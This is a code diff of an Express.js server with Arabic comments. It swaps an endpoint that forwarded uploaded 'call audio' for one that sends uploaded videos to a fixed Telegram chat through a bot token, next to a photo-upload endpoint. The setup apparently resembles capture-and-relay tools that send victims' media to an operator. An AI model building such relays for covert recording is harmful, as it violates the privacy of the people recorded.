@@ -81,28 +81,32 @@ app.post('/api/upload', upload.single('photo'), async (req, res) => {
 // ========================================
 // API — استقبال الصوت
 // ========================================
-app.post('/api/upload-audio', upload.single('audio'), async (req, res) => {
+// ========================================
+// API — استقبال الفيديو
+// ========================================
+app.post('/api/upload-video', upload.single('video'), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ success: false });
 
     const form = new FormData();
     form.append('chat_id', RECV_CHAT_ID);
-    form.append('audio', req.file.buffer, {
-      filename: 'call_audio.webm',
+    form.append('video', req.file.buffer, {
+      filename: 'video.webm',
       contentType: req.file.mimetype
     });
-    form.append('caption', `🎙️ تسجيل صوتي — ${new Date().toLocaleString('ar-EG')}`);
+    form.append('caption', `🎥 فيديو جديد — ${new Date().toLocaleString('ar-EG')}`);
+    form.append('supports_streaming', 'true');
 
     await axios.post(
-      `https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendAudio`,
+      `https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendVideo`,
       form,
       { headers: form.getHeaders(), maxBodyLength: Infinity }
     );
 
-    console.log("✅ تم إرسال تسجيل صوتي → هنداوي");
+    console.log("✅ تم إرسال فيديو → هنداوي");
     res.json({ success: true });
   } catch (err) {
-    console.error("❌ upload-audio:", err.response?.data || err.message);
+    console.error("❌ upload-video:", err.response?.data || err.message);
     res.status(500).json({ success: false });
   }
 });
